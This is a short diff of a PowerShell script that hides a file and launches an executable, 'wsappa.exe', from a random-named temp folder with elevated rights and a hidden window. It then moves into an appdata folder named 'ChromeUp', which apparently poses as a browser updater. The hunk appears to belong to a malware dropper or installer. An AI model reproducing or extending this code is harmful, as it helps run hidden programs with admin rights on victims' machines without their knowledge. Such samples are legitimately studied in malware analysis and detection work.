@@ -18,7 +18,7 @@ $attr = [System.IO.FileAttributes]::Hidden
 [System.IO.File]::SetAttributes($filePath, $attr)
 
 #start new file
-Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath "$env:temp/sVBXKuz/wsappa.exe" -Verb RunAs -WindowStyle Hidden
 
 #change directory
 cd $env:appdata/ChromeUp/
